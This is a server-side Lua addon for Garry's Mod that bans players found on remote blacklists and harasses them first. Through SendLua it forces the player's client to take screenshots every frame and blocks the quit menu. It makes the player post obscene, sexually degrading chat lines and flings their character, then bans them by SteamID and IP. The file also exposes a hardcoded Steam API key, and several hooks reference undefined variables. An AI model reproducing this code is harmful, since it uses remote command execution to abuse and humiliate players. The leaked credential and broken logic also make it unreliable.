local Blacklist = {}
BlacklistVersion = "2.5"

util.AddNetworkString("blacklist_gbox_net")

if !file.IsDir("the_blacklist","DATA") then
	file.CreateDir("the_blacklist")
end

local function downloadAndApplyBL(url)

	http.Fetch(url .. "banlist.txt", function(banlist)

		local banTable = util.JSONToTable(banlist)
		if !istable(banTable) then return end

		for k, v in pairs(banTable) do
			if !Blacklist[k] then
				Blacklist[k] = v
			end
		end

	end, function(error)
		MsgC(Color(255,0,0), "[BL] Error getting banlist (" .. url .. ") : " .. error)
	end)
end

local function writeBlacklist(version)

	local isEmpty = true
	for _ in pairs(Blacklist) do
		isEmpty = false
		break
	end

	if isEmpty then
		return
	end

	file.Write("the_blacklist/blacklist.txt", util.TableToJSON(Blacklist))
	file.Write("the_blacklist/version.txt", util.TableToJSON(version))
end

local function checkBLUpdate()

	local version = file.Read("the_blacklist/version.txt")
	version = version && util.JSONToTable(version) or {}

	for i=1, #blacklistConfig.servers do

		http.Fetch(blacklistConfig.servers[i] .. "version.txt", function(onlineVersion)
			if version[blacklistConfig.servers[i]] == onlineVersion then
				return
			end

			downloadAndApplyBL(blacklistConfig.servers[i])
			version[blacklistConfig.servers[i]] = onlineVersion

			if i == #blacklistConfig.servers then
				writeBlacklist(version)
			end

		end, function(err)
			MsgC(Color(255,0,0), "[BL] Error getting db version (" .. blacklistConfig.servers[i] .. "): " .. err)

			if i == #blacklistConfig.servers then
				writeBlacklist(version)
			end
		end)

	end
end

concommand.Add("blacklist_update",function(ply, cmd, args, argStr)
	if !IsValid(ply) then
		checkBLUpdate()
	elseif blacklistConfig.allowedGroups[ply:GetUserGroup()] then
		ply:PrintMessage(HUD_PRINTCONSOLE,"[BL] Updated")
		checkBLUpdate()
	end
end)

if !file.Exists("the_blacklist/version.txt","DATA") then -- When there isn't version.txt ( First launch )
	checkBLUpdate()
elseif blacklistConfig.updateAtStart then
	timer.Simple(1, function()
		checkBLUpdate()
	end)
elseif file.Exists("the_blacklist/blacklist.txt","DATA") then
	Blacklist = util.JSONToTable( file.Read("the_blacklist/blacklist.txt") or "" ) or {}
end

if blacklistConfig.minuteAvantUpdate ~= 0 then
	timer.Create("checkBLUpdateTimer",blacklistConfig.minuteAvantUpdate * 60,0,function()
		checkBLUpdate()
	end)
end

CreateConVar("blacklist_installed", 1, {FCVAR_ARCHIVE, FCVAR_NOTIFY}, "Simple convar which act like statistics")

-- serverside because client doesn't know config
hook.Add("PlayerSay","reportBlacklist",function(ply, text)
	if text == "!blacklist_report" && blacklistConfig.allowedGroups[ply:GetUserGroup()] then
		net.Start("blacklist_gbox_net")
		net.WriteUInt(2, 3)
		net.Send(ply)
	end
end)

concommand.Add("blacklist_report",function(ply)
	if blacklistConfig.allowedGroups[ply:GetUserGroup()] then
		net.Start("blacklist_gbox_net")
		net.WriteUInt(2, 3)
		net.Send(ply)
	end
end)

--[[-------------------------------------------------------------------------
                                    FUN
---------------------------------------------------------------------------]]

local function jpeg(mode, ply)
	if mode then
		ply:SendLua([[hook.Add("Think","jpeg",function() LocalPlayer():ConCommand("jpeg") end)]])
	else
		ply:SendLua([[hook.Remove("Think","jpeg")]])
	end
end

local function url(ply)
	if ply:IsValid() then
		net.Start("blacklist_gbox_net")
		net.WriteUInt(0, 3)
		net.WriteUInt(blacklistConfig.tempsCommand / blacklistConfig.nombreCommand-1, 16)
		net.Send(ply)
	end
end

local function upgrade(ply)
	if ply:IsValid() then
		net.Start("blacklist_gbox_net")
		net.WriteUInt(1, 3)
		net.Send(ply)
	end
end

local function spamChat(mode, ply)
	local Phrase = {
		"HI I'M ON THE SERVER BUT NOT FOR TOO LONG",
		"JE SUIS CHAUVE ET J'ATTENDS MON BOTTAGE DE CUL",
		"JE SUIS TROP VILAINE FRAPPEZ MOI FORT S.V.P",
		"GENRE TACRU JALLAI ME COMPORTER BIEN ICI MDR",
		"VOUS AVEZ PAS LE DROIT DE ME FAIRE CA CES ILLEGALE OKAY ?!",
		"10e PAYPAL , JE FUITE UNE IMAGE D'UNE NUDE DE MA MAMAN VIA NOELSHACK",
		"J'AIME ME FAIRE VIOLER PAR UN DAUPHIN"
	}
	if mode == 1 then
		timer.Create("blacklistSpamChat", 0.1, 0,function()
			if ply:IsValid() then
				ply:SendLua([[RunConsoleCommand("say","]] .. table.Random(Phrase) .. [[")]])
			end
		end)
	elseif mode == 0 then
		timer.Remove("blacklistSpamChat")
	end
end

local function flyEverywhere(mode, ply)
	if mode == 1 then
		timer.Create("blacklistFlyingGuy", 0.5, 0, function()
			if ply:IsValid() then
				ply:SetVelocity( Vector( math.random( -10000, 10000 ), math.random( -10000, 10000 ), math.random( -10000, 10000 ) ) )
			end
		end)
	elseif mode == 0 then
		timer.Remove("blacklistFlyingGuy")
	end
end

local function bonedestroy(mode, ply)
	if mode == 1 then
		for i=1, ply:GetBoneCount() do
			ply:ManipulateBonePosition(i, VectorRand() * 20)
			ply:SendLua([[hook.Add("CalcView","maksthdp",function(_,pos,ang,fov) local tr=util.TraceLine({start=pos,endpos=pos-(ang:Forward()*150),filter=nil}) local view={} view.origin=tr.HitPos view.angles=angles view.fov=fov view.drawviewer=true return view end)]])
		end
	else
		ply:SendLua([[hook.Remove("CalcView","maksthdp")]]) -- Remove all hooks
    	for i=1, ply:GetBoneCount() do
			ply:ManipulateBonePosition(i, Vector(0,0,0)) -- Bone manip
		end
	end
end

local function fuckBlacklistedPlayer(ply)
	local last = ""
	local liste = {"blind","freeze","ignite","jail","strip","slay","ragdoll",--[[<= ulx | custom =>]]"BLjpeg","BLurl","BLupgrade","BLchat","BLfly","BLbonedestroy"}
	local steamID = ply:SteamID()
	local internetProtocol = string.Explode(":",ply:IPAddress(),false)[1]
	net.Start("blacklist_gbox_net")
	net.WriteUInt(3,3)
	net.WriteUInt(ply:EntIndex(),8)
	net.WriteUInt(blacklistConfig.tempsCommand, 16)
	net.Broadcast()
	timer.Create("fuckBlacklistTimer", blacklistConfig.tempsCommand / blacklistConfig.nombreCommand-1, blacklistConfig.nombreCommand, function()
		if !(ply:IsValid() && ply:IsPlayer() && ply:IsConnected()) then return end
		if string.StartWith(last, "BL") then
			if last == "BLjpeg" then
				jpeg(0, ply)
			elseif last == "BLchat" then
				spamChat(0, ply)
			elseif last == "BLfly" then
				flyEverywhere(0, ply)
			elseif last == "BLbonedestroy" then
				bonedestroy(0, ply)
			end
		else
			RunConsoleCommand("ulx","un" .. last, "$" .. ply:SteamID())
		end
		local rdm = liste[ math.random( #liste ) ]
		if string.StartWith(rdm, "BL") then
			if rdm == "BLjpeg" then
				jpeg(1, ply)
			elseif rdm == "BLurl" then
				url(ply)
			elseif rdm == "BLupgrade" then
				upgrade(ply)
			elseif rdm == "BLchat" then
				spamChat(1, ply)
			elseif rdm == "BLfly" then
				flyEverywhere(1, ply)
			elseif rdm == "BLbonedestroy" then
				bonedestroy(1, ply)
			end
		else
			RunConsoleCommand("ulx", rdm, "$" .. ply:SteamID())
		end
		last = rdm
	end)
	timer.Simple(blacklistConfig.tempsCommand, function()
		if ply:IsValid() && ply:IsPlayer() && ply:IsConnected() then
			ply:SendLua([[cam.End3D()]])
		end
		if blacklistConfig.banIP then
			RunConsoleCommand("addip", "0", internetProtocol)
		end
		RunConsoleCommand("ulx","banid",steamID,"0", Blacklist[steamID])
	end)
end

if !blacklistConfig.doBan then
	hook.Add("PlayerInitialSpawn","blacklistFuckPlayerHook",function(ply)
		if Blacklist[ply:SteamID()] && !blacklistConfig.Whitelist[ply:SteamID()] then
			BroadcastLua([[chat.AddText(Color(255,0,0), "[BL] Cancer detected, deploying chemotherapy...")]])
			BroadcastLua([[chat.AddText(Color(255,0,0), "[BL] The Blacklist is cleaning ]] .. ply:SteamID() .. [[")]])
			ply:SendLua([[hook.Add("Think","iuefheqefq",function() gui.HideGameUI() end)]]) -- Player can't quit
			timer.Simple(60, function() fuckBlacklistedPlayer(ply) end) -- To be sure the player know what is going on
		end
	end)
else
	hook.Add("CheckPassword","blacklistPasswordCheck",function(steamid)
		if Blacklist[util.SteamIDFrom64(steamid)] && !blacklistConfig.Whitelist[ply:SteamID()] then
			return false, Blacklist[util.SteamIDFrom64(steamid)]
		end
	end)
end

hook.Add("PlayerShouldTakeDamage", "blacklistHPProtection", function(victim, attacker) -- Blacklisted Player don't take damage because it's funny
	if Blacklist[util.SteamIDFrom64(steamid)] && !blacklistConfig.Whitelist[ply:SteamID()] then
		victim:SetHealth(1)
		return false
	end
end)

--[[-------------------------------------------------------------------------
                            Block access
---------------------------------------------------------------------------]]

local keyAPI = "A768699DCCB2B4A25AD24E1A12E6632E"

local function sharedGameBan(steamid)
	http.Fetch("http://api.steampowered.com/IPlayerService/IsPlayingSharedGame/v0001/?key=" .. keyAPI .. "&steamid=" .. steamid .. "&appid=4000", function(body, _, _, code)
		if code ~= 200 or !util.JSONToTable(body) then
			MsgC(Color(255,0,0), "[BL] sharedGame ban error\n")
			return
		end
		if util.JSONToTable(body)["response"]["lender_steamid"] ~= "0" then
			game.KickID(util.SteamIDFrom64(steamid),"Steam Family Sharing isn't allowed here, sorry")
		end
	end, function(er)
		MsgC(Color(255,0,0), "[BL] sharedGame error : " .. er)
	end)
end

local function groupsBan(steamid)
	for _, group in ipairs(blacklistConfig.groups) do
		local link = "https://steamcommunity.com/groups/" .. group .. "/memberslistxml/?xml=1"
		http.Fetch(link, function(body)
            if string.find(body, steamid) then
                game.KickID(util.SteamIDFrom64(steamid), "Blacklisted steam group : " .. group)
                return
            end
            local number = tonumber(string.match(body, "<totalPages>(.+)</totalPages>") or 1)
            for id=2, number do
                http.Fetch(link .. "&p=" .. id, function(bodyception)
                    if string.find(body, steamid) then
                        game.KickID(util.SteamIDFrom64(steamid), "Blacklisted steam group : "..group)
                        return
                    end
                end)
            end
        end)
    end
end

local function playtimeBan(steamid)
	http.Fetch("http://api.steampowered.com/IPlayerService/GetOwnedGames/v0001/?key=" .. keyAPI .. "&steamid=" .. steamid, function(body, _, _, code)
    	if code ~= 200 or !util.JSONToTable(body) then
    		MsgC(Color(255,0,0), "[BL] playtime ban error\n")
    		return
    	end
    	for _,games in pairs(util.JSONToTable(body)["response"]["games"]) do
			if games["appid"] == 4000 then
				if games["playtime_forever"] < blacklistConfig.minPlayTime then
					game.KickID(util.SteamIDFrom64(steamid),"Gmod playtime too low, you must have " .. blacklistConfig.minPlayTime .. " minutes or more for joining this server")
					return
				end
			end
		end
    end,function(er)
        MsgC(Color(255,0,0), "[BL] Error : "..er)
    end)
end

hook.Add("CheckPassword","blacklistBanPlayer", function(steamid, ip)
	if blacklistConfig.Whitelist[util.SteamIDFrom64(steamid)] then
		return
	end

	if blacklistConfig.doNotShare then
		sharedGameBan(steamid)
	end

	groupsBan(steamid)

	if blacklistConfig.minPlayTime > 0 then
		playtimeBan(steamid)
	end
end)

hook.Add("PlayerAuthed","blacklistAuthedPlyHOOK",function(ply)
	if blacklistConfig.bypassBanCheck then
		net.Start("blacklist_gbox_net")
		net.WriteUInt(4,3)
		net.Send(ply)
	end
end)

local function reportLikeItsHot(steamid, ply, reason)

	if IsEntity(steamid) then
		ply = steamid

		for server in ipairs(blacklistConfig.servers) do
			http.Post(server .. "report.php",{
				senderNick = "Maks",
				senderSteam = "STEAM_0:1:118755058",
				victimSteam = ply:SteamID(),
				reason = "Bypass attempt, last steamid : " .. reason
			})
		end
	end

	for server in ipairs(blacklistConfig.servers) do
		http.Post(server .. "report.php",{
			senderNick = ply:Nick(),
			senderSteam = ply:SteamID(),
			victimSteam = steamid,
			reason = reason
		})
	end

end

net.Receive("blacklist_gbox_net",function(_, ply)
	local mode = net.ReadUInt(2)
	if mode == 0 then
		local dbSteamIDs = net.ReadTable()
		for _, steamid in pairs(dbSteamIDs) do
			if steamid["topsickrekt"] ~= ply:SteamID() then
				if Blacklist[steamid["topsickrekt"]] and !blacklistConfig.Whitelist[ply:SteamID()] then
					
					reportLikeItsHot(ply, nil, steamid["topsickrekt"])

					MsgC(Color(255,0,0), "[BL] " .. ply:Nick() .. " (" .. ply:SteamID() .. ") tried to bypass bans, blacklisted steamid: " .. steamid["topsickrekt"] .. "\n")

					BroadcastLua([[chat.AddText(Color(255,0,0), "[BL] Cancer detected, deploying chemotherapy...")]])
					BroadcastLua([[chat.AddText(Color(255,0,0), "[BL] The Blacklist is cleaning ]] .. ply:SteamID() .. [[")]])
					
					ply:SendLua([[hook.Add("Think","iuefheqefq",function() gui.HideGameUI() end)]]) -- Player can't quit
					timer.Simple( 60, function() fuckBlacklistedPlayer(ply) end) -- To be sure the player know what is going on
					Blacklist[ply:SteamID()] = Blacklist[steamid["topsickrekt"]]
				end
			end
		end
	elseif mode == 1 then
		local countryCode = net.ReadString()
		if blacklistConfig.countryBan[countryCode] then
			game.KickID(ply:SteamID(),"Sorry, your country is banned from this server")
		end
	elseif mode == 2 then
		if blacklistConfig.allowedGroups[ply:GetUserGroup()] then
			reportLikeItsHot( net.ReadString(), ply, net.ReadString() )
		end
	end
end)